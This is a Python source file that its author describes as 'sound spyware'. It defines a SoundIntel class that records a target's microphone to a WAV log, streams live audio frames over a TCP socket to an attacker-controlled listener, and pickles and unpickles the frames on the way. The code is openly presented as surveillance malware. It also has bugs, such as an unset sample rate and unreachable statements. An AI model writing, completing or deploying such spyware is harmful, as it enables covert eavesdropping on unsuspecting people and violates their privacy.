#I want to create a script that would allow for sound spyware

#Useful libraries that I would be working with -->
import sys
import threading
import socket
import ip_info
import pickle
import struct
import traceback
import sounddevice as sd
import soundfile as sf
import pyshine as ps
import time
import connection as conn_

#This class would handle every sound related intel
class SoundIntel:
    def __init__(self, attacker = None, target = None):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.port = 3399
        self.user, self.host, self.publicIP, self.privateIP = ip_info.main()
        self.backlog = 10
        self.target = target
        self.attacker = attacker

    #This function would handle sound recording
    def soundRecord(self, secs):
        try:
            audioFile = f'{self.target}_SoundLog.wav'
            mydata = sd.rec(int(self.samplerate * secs), samplerate = self.samplerate, channels = 2, blocking = True)
            sf.write(audioFile, mydata, self.samplerate)
            print(f"{audioFile} --> successfully written!")
        except Exception as e:
            print(f"sound record wasn't successful due to [{e}]")
        finally:
            return audioFile

    #This function would handle the streaming of target's system sound 
    def sender(self, host):
        mode = "send"
        name = "CLIENT SENDING AUDIO"

        try:
            audio, context = ps.audioCapture(mode = mode)
            self.s.connect((host, self.port))
            print(f"Connected to {host}: {self.port}")

            print(f"Self S: {self.s}")
            if self.s:
                stat = conn_.status(host, self.port)
                #if stat:
                while True:
                    try:
                        frame = audio.get()
                        a = pickle.dumps(frame)
                        message = struct.pack("Q", len(a)) + a
                        self.s.sendall(message)

                    except Exception as e:
                        self.s.close()
                        raise ConnectionError(f"[{e}]")
                        sys.exit()
                else:
                    raise ConnectionError
                    sys.exit()

        except Exception as e:
            self.s.close()
            print(f"An error occurred in sound sender function due to [{e}]")
            raise KeyboardInterrupt
            #while stat != False:
            #    continue

            #sys.exit() 
        #inally:
        while stat != False:
            continue
        self.s.close()
        raise KeyboardInterrupt

    #This function handles the receiving of the target's sound stream
    def receiver(self, host):
        try:
            mode = "get"
            name = "SERVER RECEIVING AUDIO"

        #try:
            audio, context = ps.audioCapture(mode = mode)
            #ps.showPlot(context, name)
            self.s.bind((host, self.port))
            self.s.listen(self.backlog)
            print(f"Establishing connection on {host}: {self.port}")
            time.sleep(1)
            print(f"Waiting for connection on {host}: {self.port}")
        
            #This function handles the listening function
            def listenClient(addr, client_soc):
                try:
                    print(f"{addr} has connected")
                    if client_soc:
                        data = b''
                        payloadSize = struct.calcsize("Q")
                        while True:
                            #print(f"Data: {data}")
                            #print(f"Payload Size: {payloadSize}")
                            while len(data) < payloadSize:
                                packet = client_soc.recv(4 * 1024)
                                if not packet:
                                    break
                                data += packet
                            packedMsgSize = data[:payloadSize]
                            data = data[payloadSize:]
                            msgSize = struct.unpack("Q", packedMsgSize)[0]
            
                            #print(f"Msg Size: {msgSize}")
                            while len(data) < msgSize:
                                data += client_soc.recv(4 * 1024)
                            frameData = data[:msgSize]
                            data = data[msgSize:]
                            frame = pickle.loads(frameData)
                            audio.put(frame)
                        
                        self.s.close()
                        stat = "Sound receiver set up was successful"
                        print(stat)
                except Exception as e:
                    stat = f"An error occured when setting up sound receiver due to [{e}]"
                    print(stat)
                finally:
                    pass

            while True:
            
                client_soc, addr = self.s.accept()
                #stat = conn_.status(self.privateIP, self.port)
                print(f"Client Socket: {client_soc}")
                if client_soc:
                    thread = threading.Thread(target = listenClient, args = (addr, client_soc, ))
                    thread.start()
                
                    print("Total clients: ", threading.activeCount() - 1)
                else:
                    sys.exit()
                    raise KeyboardInterrupt
        except:
            traceback.print_exc()


if __name__ == "__main__":
    pass
